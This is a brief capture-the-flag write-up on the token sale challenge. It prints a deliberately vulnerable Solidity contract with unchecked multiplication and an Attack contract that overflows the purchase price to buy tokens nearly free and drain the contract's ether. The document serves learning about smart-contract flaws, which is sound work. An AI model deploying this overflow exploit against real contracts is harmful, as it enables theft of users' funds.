## Description
I started to think for an overflow. Like in ethernaut level where there was a hint about odometer. I forgot that ether is automatically converted to wei and then the calculations proceed. Now I won't forget.
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract TokenSaleChallenge {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    constructor() public payable {
        require(msg.value == 1 ether, "Must send 1 ether to initialize");
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable {
        require(msg.value == numTokens * PRICE_PER_TOKEN, "Incorrect value sent for the number of tokens");

        balanceOf[msg.sender] += numTokens;
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens, "Not enough tokens to sell");

        balanceOf[msg.sender] -= numTokens;
        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);
    }
}
```

```
contract Attack {
    TokenSaleChallenge public tokenSaleChallenge;

    constructor(address _tokenSaleChallenge) public {
        tokenSaleChallenge = TokenSaleChallenge(_tokenSaleChallenge);
    }

    function attack() public payable {
        uint256 numTokens = 115792089237316195423570985008687907853269984665640564039458;

        (bool success, ) = address(tokenSaleChallenge).call.value(msg.value)(abi.encodeWithSignature("buy(uint256)", numTokens));
        require(success, "buy failed");

        tokenSaleChallenge.sell(1);

        msg.sender.transfer(address(this).balance);
    }

    // Function to receive ether
    receive() external payable {}
}
```